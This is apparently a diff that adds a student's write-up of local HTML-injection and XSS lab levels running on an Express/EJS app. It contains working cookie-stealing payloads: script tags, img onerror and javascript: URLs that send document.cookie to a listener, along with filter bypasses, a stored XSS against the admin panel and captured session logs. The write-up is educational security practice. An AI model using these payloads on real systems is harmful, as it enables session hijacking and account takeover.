@@ -1,0 +1,608 @@
+[Part 1: Before we start]
+
+    - This time I gonna tell you a little bit about JavaScript web APIs
+
+        (The hierarchy below is created by CBJS, I just re-draw it in ASCII)
+
+                                  +-------------+
+                            +-----|   history   |
+                            |     +-------------+ 
+                            |  
+                            |  
+          +-----------+     |     +-------------+
+          |  windows  |-----+-----|  location   |
+          +-----------+     |     +-------------+
+                            |
+                            |
+                            |     +-------------+
+                            +-----|  navigator  |
+                            |     +-------------+                                                   (...) 
+                            |                                                                         |
+                            |                               +------------+     +----------------+     |     +--------------+                 +-----------------+
+                            |                         +-----|    body    |-----| div (id=lobby) |-----+-----| p (id=room1) |--- InnerText ---| Thank you! CBJS |
+                            |                         |     +------------+     +----------------+     |     +--------------+                 +-----------------+
+                            |                         |                                               |
+                            |                         |                                             (...)
+                            |     +-------------+     |     +------------+ 
+                            +-----|     DOM     |-----+-----|   cookie   |
+                                  +-------------+     |     +------------+ 
+                                                      |
+                                                      |
+                                                      |     +-------------+ 
+                                                      +-----| DOM Methods |
+                                                            +-------------+
+
+        [?] "APIs" _ "Application Programming Interfaces" are sets of rules and protocols that allow different software applications to communicate with each other.
+
+        [?] "window" is where everything begins, it is the first thing created when the browser opens a website
+
+                [Example]: window.InnerHeight <=> 0
+                        
+                           window.InnerWidth <=> 0
+
+        [?] "navigator" contains information about the user's browser    
+
+                [Example]: window.navigator.userAgent <=> Mozilla/5.0 (X11, Linux x86_64, rv:109.0) Gecko/20109101 Firefox/114.0
+                        
+                           window.navigator.language <=> en-US
+
+        [?] "history" allows us to interact with the browser's history
+
+                [Example]: window.history.lenght <=> 177013 (~.~!)
+                        
+                           window.history.back() <=> return to the previous web
+
+        [?] "location" stores info about the URL of the website you are using. Also, it can help you redirect to other websites
+
+                [Example]: window.location.href <=> https://www.hungthinhtran.com
+                        
+                           window.location.protocol  <=> https
+
+        [?] "DOM Methods" contains many functions like getElementById(), getElementByTagName(), getElementByClassName() ...
+                           all of them were born to help developers interact with DOM tree 
+
+    - A long time ago, in a galaxy far far away, there was a man called Tim Berners-Lee, he is the father of WWW (World Wide Web) and HTML (Yeah! he's still alive)
+
+    - Since HTML is just like a blue-print for the website and there is no user interaction, developers want something that can make their website more lively
+
+        => That is the reason why JavaScript was born
+
+    - But each browser used JavaScript in its own way, which led to a consequence that your browser may not show websites that were created for another specific browser
+
+        => And W3C (World Wide Web Consortium) was the one who united them all by publicizing the DOM tree (Document Object Model) => The problem was solved
+
+    - So! Before deep dive into the battlefield of injection, you should know about SOP (Same-Origin Policy)
+
+        [+] This is a fundamental security mechanism in the World Wide Web that restricts how a web browser interacts with resources from different origins.
+
+            => Prevent malicious scripts from accessing sensitive data from other websites without the user's consent
+
+        [+] The SOP enforces the concept of origin, which is typically defined as a combination of the scheme (like HTTP or HTTPS), hostname, and port number of a URL.
+
+        [+] A web page loaded from one origin cannot make requests to resources from a different origin unless explicitly allowed.
+
+    - Now, we gonna focus on Express - Node.js, I will explain them as slowly and easy to understand as possible
+
+    - The question is "What are Node.js and Express"
+
+        [+] Node.js is a JavaScript runtime environment, which allows you to execute JS code outside of the web browser 
+            (it means that it primarily resides in the realm of back-end development)
+
+            Node.js excels in handling server-side operations, such as processing requests, managing data, and communicating with databases.
+
+            While Node.js can be employed for front-end tasks, such as creating interactive user interfaces, its true strength lies in the back-end
+
+        [+] Express is a web framework built upon Node.js, much like a castle is built upon a foundation of stone
+
+            Express empowers developers to define routes, handle HTTP requests, render dynamic content, and manage application state
+
+            While Node.js is the engine that powers your application, Express serves as the framework that shapes its structure and organization.
+
+    - Now! you may read the Dockerfile and think "What the hack is going on". Nah! it just a few lines of docker setup for npm to 
+      download some dependencies and open the http server
+
+        [?] npm stands for "Node Package Manager." It is the default package manager for Node.js
+
+            Using package.json, it can download various external libraries (you can specify them in a package.json file)
+
+            Just think about the relationship between maven and pom.xml, this one is kinda liked that
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Part 2: HTML Injection]
+
+[Level 1]
+
+[*] Target: http://localhost:13001/
+
+    - First thing first, you need to see the tree
+
+            root@8202d29b3513:/app# tree
+            .
+            |-- app.js
+            |-- package.json
+            |-- routes
+            |   |-- index.js
+            |   `-- note.js
+            `-- views
+                `-- index.ejs
+
+    - This is where our web server is running (npm start here)
+
+        [?] app.js: a script that sets up and configures an Express.js web application
+
+            Example: 
+
+                    [+] Sets the port on which the server will listen
+
+                        const port = parseInt(process.env.PORT) || 3000;
+
+                        => And yeah! This the reason why these lines existed in the Dockerfile
+
+                            ports:
+                                - "13001:3000"
+
+                    [+] configure the view engine for rendering templates
+
+                            app.set("views", path.join(__dirname, "views"));
+                            app.set("view engine", "ejs");
+                   
+                        => Sound weird right? Since we are all familiar with the automated rendering function in PHP
+
+                    ...
+
+        [?] package.json: just like the pom.xml in Java, they all be used to config and download dependencies
+
+        [?] /routes: This folder contains js files that are used to handle the main functions of the website
+
+                    var indexRouter = require("./routes/index");
+                    app.use(indexRouter);
+
+                    var noteRouter = require("./routes/note");
+                    app.use(noteRouter);
+
+    - After playing a little bit, we know that "Note here: {anything you typed}" takes us to "OK"
+
+      and "Search: {anything you typed}" led us to search?q={anything you typed} <=> "Your search - {anything you typed} - did not match any notes."
+
+    - Cool! now we gonna look at the back end
+
+            [+] note.js:    
+
+                const { application } = require('express');
+                var express = require('express'); // [?] "require" in JS is just like "import" library in python, and in this case, they used "express"
+                var router = express.Router(); // [?] router variable from now on can handle routes
+
+                router.get('/note', function (req, res, next) { // [?] When a client sends a GET request to this endpoint, the function will be executed
+                    res.json(req.session.notes); // [?] Sends a JSON response to the client, where the content of the response is the array of notes
+                });
+
+                // Hehe, we gonna see it later since ... <form action="/note" method="post"> ...
+
+                router.post('/note', function (req, res, next) { // [?] When a client sends a POST ... we all know what's going on right 
+                    req.session.notes.push(req.body.note);
+                    res.send("OK");
+                });
+
+                module.exports = router;
+
+            [Testing time] I change the "post" request to "get"
+
+                    POST /note HTTP/1.1
+                    Host: localhost:13001
+                    ...              
+
+                    note=thinhbeo31337
+
+                    => GET /note?note=thinhbeo31337 HTTP/1.1
+                    ...
+
+                => 0 : "thinhbeo31337" (and a black screen with a variable is set in Json format)
+
+            => However, there is no place for us to inject HTML code
+
+            [+] index.js:
+
+                ...
+                router.get('/search', function (req, res, next) {
+                    html = 'Your search - <b>' + req.query.q + '</b> - did not match any notes.<br><br>'
+                    res.send(html);
+                });
+                ...
+
+                => Yeah! that's what I'm talking about (^.^~)
+
+            => In this case, if what I typed was "<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">click here</a>" 
+
+            <=> http://localhost:13001/search?q=%3Ca%20href=%22https://www.youtube.com/watch?v=dQw4w9WgXcQ%22%3Eclick%20here%3C/a%3E
+
+            => The result will look like this "Your search - click here - did not match any notes."
+
+                <=> Your search - <b><a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">click here</a></b> - did not match any notes.<br><br>
+
+        - Not only HTML you can also inject JS code, we have <script> tag right (~.~!), and you can do something like 
+
+            => <script>alert("bạn đã bị hắc cơ lỏ vụt cho tung đít")</script>
+
+        => And if you sent the injected URL to someone else, they will also see the alert
+
+        - Just a bonus, how can we know whether they clicked on our URL or not, let me remind you of the trigger trick 
+
+        => <script>var payload = new XMLHttpRequest(); payload.open('GET', 'http://localhost:12345/mot_thang_vua_bi_vut', true); payload.send();</script>
+
+            (base) bigbox@ubuntu:~/Desktop$ python3 -m http.server 12345
+            Serving HTTP on 0.0.0.0 port 12345 (http://0.0.0.0:12345/) ...
+            127.0.0.1 - - [13/Jan/2024 00:33:11] code 404, message File not found
+            127.0.0.1 - - [13/Jan/2024 00:33:11] "GET /mot_thang_vua_bi_vut HTTP/1.1" 404 -
+
+        - But if this kind of attack is just like a rickroll, it will not be that dangerous. So, what if I do this
+
+            <script>const cookie = document.cookie; const payload = `http://localhost:8000/steal.php?cookie=${cookie}`;fetch(payload);</script>
+
+            // [?] With this line, I can gather the target's cookie, and as you may know, this is one of the most classic purposes of XSS attack
+
+            (base) bigbox@ubuntu:~/Desktop$ python3 -m http.server
+            Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+            127.0.0.1 - - [13/Jan/2024 00:40:31] code 404, message File not found
+            127.0.0.1 - - [13/Jan/2024 00:40:31] "GET /steal.php?cookie=connect.sid=s%3AQaK2isDTgVsaM...qjBp8D9iQ HTTP/1.1" 404 -
+
+    [Final Result: Stole the target's cookie] GET /steal.php?cookie=connect.sid=s%3AQaK2isDTgVsaM...qjBp8D9iQ
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 2]
+
+[*] Target: http://localhost:13002/
+
+    - Let's see what do we have here
+
+        [+] note.js (Nothing is different)
+
+        [+] index.js
+
+            router.get('/search', function (req, res, next) {
+                sanitized_q = req.query.q.replace(/<script>|<\/script>/gi, ""); // security mechanism (~.~!)
+                html = 'Your search - <b>' + sanitized_q + '</b> - did not match any notes.<br><br>'
+                res.send(html);
+            });
+
+            [?] req.query.q represents the user input received as a query parameter in the HTTP request
+
+            [?] .replace() is a JavaScript method used to replace a specified pattern with a new value
+
+            [?] /<script>|</script>/gi is a regular expression pattern that matches occurrences of the <script> and </script> tags in the input
+
+                    [*] g flag ensures that all occurrences are replaced (not just the first one)
+
+                    [*] i flag makes it case-insensitive
+
+    - So we can't use <script> tag, but there are others that can do the same function like 
+
+        [+] <iframe src="{An injected URL}"></iframe> 
+
+            // [?] However the content of that iframe is loaded and executed within the context of the embedded page, not your main webpage
+
+            you can turn it to <iframe src="javascript:alert('bạn đã bị hắc cơ lỏ vụt cho tung đít')">
+
+        [+] <img src="fake_image.png" onerror="alert('bạn đã bị hắc cơ lỏ vụt cho tung đít')">
+
+            // [?] The onerror attribute of the <img> tag can be used to execute JavaScript code if the specified image fails to load.
+
+        ....
+
+    [Testing Time] <iframe src="javascript:const cookie = document.cookie; const payload = `http://localhost:8000/steal.php?cookie=${cookie}`;fetch(payload);">
+
+        (base) bigbox@ubuntu:~/Desktop$ python3 -m http.server
+        Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+        127.0.0.1 - - [14/Jan/2024 00:56:05] code 404, message File not found
+        127.0.0.1 - - [14/Jan/2024 00:56:05] "GET /steal.php?cookie=connect.sid=s%3Ag5BzwsGJbhgX...6ycmaNk2xYcY HTTP/1.1" 404 -
+    
+    [Final Result: Stole the target's cookie] GET /steal.php?cookie=connect.sid=s%3Ag5BzwsGJbhgX...6ycmaNk2xYcY
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 3]
+
+[*] Target: http://localhost:13003/
+
+    - Okay! look at the source code
+
+        [+] note.js (Nothing is different)
+
+        [+] index.js
+
+            ...
+            router.get('/search', function (req, res, next) {
+                // Don't allow script keyword
+                if (req.query.q.search(/script/i) > 0) {
+                    res.send('Hack detected');
+                    return;
+                }
+                html = 'Your search - <b>' + req.query.q + '</b> - did not match any notes.<br><br>'
+                res.send(html);
+            });
+            ...
+    
+    - Nothing changed! They still want to prevent us from using "script", you can solve it kinda same way as the previous lab
+
+    - However, we should use the image error trick since 'src="javascript:' contains the "script" word
+
+    [Testing Time] <img src="fake_image.png" onerror="const cookie = document.cookie; const payload = `http://localhost:8000/steal.php?cookie=${cookie}`;fetch(payload);">
+
+        (base) bigbox@ubuntu:~/Desktop$ python3 -m http.server
+        Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+        127.0.0.1 - - [14/Jan/2024 01:32:05] code 404, message File not found
+        127.0.0.1 - - [14/Jan/2024 01:32:05] "GET /steal.php?cookie=connect.sid=s%3ArPQ9SSIJf9...Sb6k%2FJzlYf8rw9gefs HTTP/1.1" 404 -
+
+    [Final Result: Stole the target's cookie] GET /steal.php?cookie=connect.sid=s%3ArPQ9SSIJf9...Sb6k%2FJzlYf8rw9gefs
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 4]
+
+[*] Target: http://localhost:13004/ 
+
+    - This lab is weird since it still prevents us from using "script" and nothing is different from the previous lab
+
+    - And yeah! I thought that there were some mistakes from cyberjutsu but when I tried to steal the target's cookie using the payload from level3, this happened
+
+        (base) bigbox@ubuntu:~/Desktop$ python3 -m http.server
+        Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+        127.0.0.1 - - [14/Jan/2024 21:55:04] code 404, message File not found
+        127.0.0.1 - - [14/Jan/2024 21:55:04] "GET /steal.php?cookie= HTTP/1.1" 404 -
+
+    - So, even when I tried to run document.cookie in the debug console, nothing was shown
+
+        => Because of that, I had to look at the back end more carefully and I found this one
+
+        [+] This is app.js from level3
+            ...
+            app.use(
+            session({
+                resave: false,
+                saveUninitialized: true,
+                secret: process.env.SECRET_KEY,
+                cookie: {
+                maxAge: 86400000,
+                httpOnly: false
+                },
+            }));
+            ...
+
+        [+] And this one is from level4
+            ...
+            app.use(
+            session({
+                resave: false,
+                saveUninitialized: true,
+                secret: process.env.SECRET_KEY,
+                cookie: {
+                maxAge: 86400000,
+                httpOnly: true 
+                },
+            }));
+            ...
+
+    - Exactly, httpOnly is the problem, this ensures that the cookie is only accessible through HTTP/S and cannot be accessed by client-side scripts
+
+    - However, this is HTML injection lab right (~.~!) not a XSS cookie-steal lab, I am still able to rickroll them (^.^~)
+
+        <img src="fake_image.png" onerror="window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';">
+
+    [Final Result: Injected] Rickroll the target
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 5]
+
+[*] Target: http://localhost:13005/ 
+
+    - Playing around a little bit, you might think that "we can easily exploit this using email right, like just enter an HTML script into the Email"
+    
+    - Hehe! Things will not be easy like that, I tried a small script and this is the result
+
+        => Welcome <h2>Thinhbeo31337</h2>!
+
+    - And even when you try all kinds of payload in the "Note here", nothing gonna changed because the note.js is no different than the others
+
+    - What is the reason for that? Okay! focus on the index.ejs (line 32th) ... <p>Welcome <%= email %>! </p> ...
+
+    - And nope! '<%=' is'nt a HTML tag okay, it's a part of ejs (Detail: https://ejs.co/#install)
+
+        => According to ejs.co, '<%=' Outputs the value into the template (HTML escaped)
+
+        => This means we can't perform HTML injection in this place, and also there is no input in the URL for us to inject stuff right (^.^!)
+
+    - If you feel like there is something blowing in your mind, exactly all the things above just are hints for you to truly understand the mindset for this kind of attack
+
+        => The only thing which can bring us victory, in this case, is localhost:13005/welcome?return_url=/
+
+        => Yeah! that's you 'return_url'
+
+        [+] welcome.ejs:
+            ...
+            <form action="/user" method="post" onsubmit="setInfo(event)">
+                <label>Email: </label>
+                <input type="text" name="email">
+                <input type="submit" value="📝">
+            ...
+            function setInfo(event) {
+                    event.preventDefault(); // [?] Just think about the 'not null' function in all other languages
+                    data = { "email": event.target.elements.email.value };
+                    fetch("/user", { // [?] make a POST request to the "/user" with the set data
+                        method: "post",
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(data),
+                    }).then(() => {
+                        localStorage.setItem("info", "true");
+                        redirect(); // [?] Active redirect() function
+                    });
+                }
+
+                function redirect() {
+                    var url = new URL(window.location);
+                    var return_url = url.searchParams.get("return_url");
+                    window.location = return_url; 
+                // [?] You may wonder 'Why? This looks weird' (~.~!) I know, I know 
+                // [?] Because window.location is not a function; it's an object that represents the current URL of the browser. 
+                }
+
+                var info = localStorage.getItem("info");
+                if (info === "true") {
+                    redirect()
+                }
+                ...
+
+    - Which means if I change the url to this
+
+        http://localhost:13005/welcome?return_url=https://www.youtube.com/watch?v=dQw4w9WgXcQ
+
+        -> After submitting the email I will be redirected to the rickroll video
+
+    - Good! and this is a small hint I give you: <a href="javascript:alert('Hello, world!')">Click me</a>
+
+    - Stop here and try to think and solve this lab yourself
+
+        (~.~!)  (~.~)   (^.^!)  (^.^~)
+
+    - Exactly! we can do the same thing with window.location which means 
+
+        http://localhost:13005/welcome?return_url=javascript:const cookie = document.cookie; const payload = `http://localhost:8000/${cookie}`;fetch(payload);
+
+    (base) bigbox@ubuntu:~/Desktop$ python3 -m http.server
+    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+    127.0.0.1 - - [15/Jan/2024 23:52:15] code 404, message File not found
+    127.0.0.1 - - [15/Jan/2024 23:52:15] "GET /connect.sid=s%3A7yj54EB47...wWnE%2Fpz1jdE2rPWlQ6E HTTP/1.1" 404 -
+
+    [Final Result: Stole the target's cookie] GET /connect.sid=s%3A7yj54EB47...wWnE%2Fpz1jdE2rPWlQ6E
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 6]
+
+[*] Target: http://localhost:13006/
+
+    - This sounds crazy, but I think the goal of this lab is to steal the admin cookie! look
+
+    - First stuff, we have the admin account
+
+        [+] admin.js
+            ...
+            //Login
+            router.post('/admin', function (req, res, next) {
+                if (!req.session.isAdmin) {
+                    if (req.body.username === "admin" && req.body.password === process.env.ADMIN_PASSWORD) { // [?] ADMIN_PASSWORD=aimabiet##33
+                        req.session.isAdmin = true;
+                        res.writeHead(302, { 'Location': '/admin' });
+                        res.end();
+                    } else {
+                        res.send('wrong username / password');
+                    }
+                }
+            }); 
+            ...
+    
+    The next thing is our requests for support will be sent and stored on the admin page                                                                      
+
+    => This situation reminds me of the Stored XSS lab I did in the Bee-Box (This is a good place to practice and improve web pentest skills)
+
+    - Okay so! we gonna think in that way
+
+        [+] /routes/ticket.js
+
+            const { application } = require('express');
+            var express = require('express');
+            var Ticket = require('../models/ticket');
+            var router = express.Router();
+
+            router.post('/ticket', function (req, res, next) {
+                try {
+                    ticket = new Ticket({ "content": req.body.content, "email": req.session.email });
+                    ticket.save();
+                    res.send("We will contact you as soon as possible.");
+                }
+                catch (e) {
+                    console.log(e);
+                    res.send("Error");
+                }
+            });
+
+            => Nah! It is just a ticket object that contains the client's email and content which can be sent to admin in JSON format
+    
+        [+] admin.ejs
+
+                ...
+                <body>
+                    <h1>Quick Note 6 - Admin panel</h1>
+                    <br>
+                    <table>
+                        <tr>
+                            <td><b>Email</b></td>
+                            <td><b>Content</b></td>
+                        </tr>
+                        <% for(var i in tickets) { %>
+                            <tr>
+                                <td>
+                                    <%- tickets[i].email %> // [?] Hehe boy (^.^~) Outputs the unescaped value into the template
+                                </td>
+                                <td>
+                                    <%= tickets[i].content %> // [?] all right (~.~!) HTML escaped
+                                </td>
+                            </tr>
+                            <% } %>
+                    </table>
+                    <br>
+                    <a href="/logout">Logout</a>
+                </body> 
+                ...           
+        
+
+    => This is the logic! we gonna make a malicious email and then submit a random content
+       Even the HTML escaped tag in the index.ejs will prevent us, however, in the admin.ejs, that vulnerable email can be actived normally
+
+        [+] Client:
+
+            Email: <img src="fake_image.png" onerror="const cookie = document.cookie; const payload = `http://localhost:8000/${cookie}`;fetch(payload);">
+            Content: bạn đã bị hắc cơ lỏ vụt cho tung đít
+
+        [+] Admin when open his/her page
+
+            (Yeah! just a error and a small message "bạn đã bị hắc cơ lỏ vụt cho tung đít")
+
+                ...
+                <tr>
+                    <td><b>Email</b></td>
+                    <td><b>Content</b></td>
+                </tr>
+                
+                    <tr>
+                        <td>
+                            <img src="fake_image.png" onerror="const cookie = document.cookie; const payload = `http://localhost:8000/${cookie}`;fetch(payload);">
+                        </td>
+                        <td>
+                            bạn đã bị hắc cơ lỏ vụt cho tung đít
+                        </td>
+                    </tr>
+                ...
+
+        (base) bigbox@ubuntu:~/Desktop$ python3 -m http.server
+        Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+        127.0.0.1 - - [16/Jan/2024 08:51:05] code 404, message File not found
+        127.0.0.1 - - [16/Jan/2024 08:51:05] "GET /connect.sid=s%3ACXJg_HUX...fohUOJAofrTxwNeNxYiTQ HTTP/1.1" 404 -
+
+    [Final Result: Stole the admin's cookie] GET /connect.sid=s%3ACXJg_HUX...fohUOJAofrTxwNeNxYiTQ
+
